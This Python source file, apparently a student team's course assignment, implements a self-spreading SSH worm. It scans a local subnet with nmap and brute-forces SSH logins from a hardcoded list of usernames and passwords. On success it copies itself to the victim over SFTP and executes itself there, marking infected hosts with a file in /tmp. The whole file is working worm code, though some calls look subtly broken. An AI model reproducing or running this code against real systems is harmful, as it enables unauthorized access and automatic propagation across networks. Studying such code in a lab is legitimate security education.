from genericpath import getmtime
import os
import sys
import socket
import paramiko
import nmap
import netinfo
# import netifaces
import socket
import fcntl
import struct
import os.path
import netifaces
from netifaces import interfaces, ifaddresses, AF_INET

nmScan = nmap.PortScanner('10.0.0.0/23', arguments='--open')

# The list of credentials to attempt
credList = [
('root', 'toor'),
('admin', '#NetSec!#'),
('osboxes', 'osboxes.org'),
('cpsc', 'cpsc')
]

# The file marking whether the worm should spread
INFECTED_MARKER_FILE = "/tmp/infected.txt"

##################################################################
# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
##################################################################


# TODO(): ADD CODE TO CHECK IF IT'S INFECTED
def isInfectedSystem():
	# Check if the system as infected. One
	# approach is to check for a file called
	# infected.txt in directory /tmp (which
	# you created when you marked the system
	# as infected). 

	# Yu
	# Go to /tmp folder?
	# read infected.txt
	# if infected.txt exists
	#	returns 1 to signify infected
	# else
	#	returns 0 to signify not infected
	# /Yu
	# kevin
	if os.path.exists(INFECTED_MARKER_FILE):
		return 1
	else:
		return 0
	# /kevin
#################################################################
# Marks the system as infected
#################################################################
# TODO(): ASSUMING THIS USES isInfectedSystem(), mark the system as infected, so it relies
# on the previous function to work 
def markInfected():
	
	# Mark the system as infected. One way to do
	# this is to create a file called infected.txt
	# in directory /tmp/
	
	# yu
	# infectedTracker = isInfectedSystem()
	# if not infected	add infected.txt into the to mark infected /tmp/ directory
	# /yu
	if isInfectedSystem()==0:
		# kevin
		f = open(INFECTED_MARKER_FILE, "a")
		f.write("filler text")
		f.close()
		# /kevin
	pass	

###############################################################
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
###############################################################
def spreadAndExecute(sshClient):
	
	# This function takes as a parameter 
	# an instance of the SSH class which
	# was properly initialized and connected
	# to the victim system. The worm will
	# copy itself to remote system, change
	# its permissions to executable, and
	# execute itself. Please check out the
	# code we used for an in-class exercise.
	# The code which goes into this 

	# yu ?
	# infectedTracker = isInfectedSystem()
	# function
	# is very similar to that code.	
	# /yu ???


	# kevin
	sftpClient = sshClient.open_sftp()
	sftpClient.put("/tmp/worm.py", "/tmp/worm.py")
	sshClient.exec_command("python3 /tmp/worm.py")
	# sshClient.exec_command("for i in {1..5}: do logger")
	pass

############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - the host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################
def tryCredentials(host, userName, password, sshClient):
	
	# Tries to connect to host host using
	# the username stored in variable userName
	# and password stored in variable password
	# and instance of SSH class sshClient.
	# If the server is down or has some other
	# problem, connect() function which you will
	# be using will throw socket.error exception.	     
	# Otherwise, if the credentials are not
	# correct, it will throw 
	# paramiko.SSHException exception. 
	# Otherwise, it opens a connection
	# to the victim system; sshClient now 
	# represents an SSH connection to the 
	# victim. Most of the code here will
	# be almost identical to what we did
	# during class exercise. Please make
	# sure you return the values as specified
	# in the comments above the function
	# declaration (if you choose to use
	# this skeleton).

	# Desirae Prather
	try:
		sshClient.connect(host, username=userName, password=password)
	except socket.error:
		# probably the server is down or is not running SSH
		print("Error: Host is unreachable")
		return 3
	except paramiko.SSHException:
		# probably wrong credentials
		print("Error: Incorrect credentials. Failed to establsh SSH connection.")
		return 1
		
	return 0
	# /Desirae Prather


###############################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instace of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
###############################################################
def attackSystem(host):
	
	# The credential list
	global credList
	
	# Create an instance of the SSH client
	ssh = paramiko.SSHClient()

	# Set some parameters to make things easier.
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	
	# The results of an attempt
	attemptResults = None
				
	# Go through the credentials
	for (username, password) in credList:
		
		# TODO: here you will need to
		# call the tryCredentials function
		# to try to connect to the
		# remote system using the above 
		# credentials.  If tryCredentials
		# returns 0 then we know we have
		# successfully compromised the
		# victim. In this case we will
		# return a tuple containing an
		# instance of the SSH connection
		# to the remote system. 


		# Desirae Prather
		if tryCredentials(host=host,userName=username,password=password,sshClient=ssh) == 0:
			print("Found and return instance of the SSH connection")
			attemptResults = (ssh, host, username, password)
		# /Desirae Prather
			
	# Could not find working credentials
	return attemptResults

####################################################
# Returns the IP of the current system
# @param interface - the interface whose IP we would
# like to know
# @return - The IP address of the current system
####################################################
def getMyIP(interface):
	
	# TODO: Change this to retrieve and
	# return the IP of the current system.
	
	# kevin
	ipAddr = None
	for netFace in interface:

			# The IP address of the interface
			tempAddr = netifaces.ifaddresses(netFace)[2][0]['addr']

			# Get the IP address
			if not tempAddr == "127.0.0.1":

				# Save the IP addrss and break
				ipAddr = tempAddr
				break
	# /kevin
		# print('the host : %s (%s)' % (host, nmScan[host].hostname()))
		# the output in the GNS3 Topology thing is ('127.0.0.1','192.168.1.2'), always
	return ipAddr


#######################################################
# Returns the list of systems on the same network
# @return - a list of IP addresses on the same network
#######################################################
def getHostsOnTheSameNetwork():
	
	# TODO: Add code for scanning
	# for hosts on the same network
	# and return the list of discovered
	# IP addresses.	
	# kevin
	hostInfo = nmScan.all_hosts()
	liveHosts = []
	for host in hostInfo:
		# uncomment this to add even non running hosts
		# liveHosts.append(host)
		# otherwise we're only going to add running hosts
		if nmScan[host].state() == "up":
			liveHosts.append(host)
	# /kevin
	return liveHosts

# If we are being run without a command line parameters, 
# then we assume we are executing on a victim system and
# will act maliciously. This way, when you initially run the 
# worm on the origin system, you can simply give it some command
# line parameters so the worm knows not to act maliciously
# on attackers system. If you do not like this approach,
# an alternative approach is to hardcode the origin system's
# IP address and have the worm check the IP of the current
# system against the hardcoded IP. 
if len(sys.argv) < 2:
	
	# TODO: If we are running on the victim, check if 
	# the victim was already infected. If so, terminate.
	# Otherwise, proceed with malice.
	# Desirae Prather 
	if isInfectedSystem()==1:
		#terminate
		exit(1)
	else:
		# infect victim
		markInfected()
	# /DesiraePrather
		
	pass

# TODO: Get the IP of the current system
# Desirae Prather
interface = interfaces()
currentIP = getMyIP(interface)
# /Desirae Prather

# Get the hosts on the same network
networkHosts = getHostsOnTheSameNetwork()

# TODO: Remove the IP of the current system
# from the list of discovered systems (we
# do not want to target ourselves!).
# yujin
networkHosts.remove(currentIP)
# /yujin
print("Found hosts: ", networkHosts)


# Go through the network hosts
for host in networkHosts:
	
	# Try to attack this host
	sshInfo =  attackSystem(host)
	
	print(sshInfo)
	
	
	# Did the attack succeed?
	if sshInfo:
		
		print("Trying to spread")
		
		# Infect that system
		spreadAndExecute(sshInfo[0])
		
		print("Spreading complete")
	

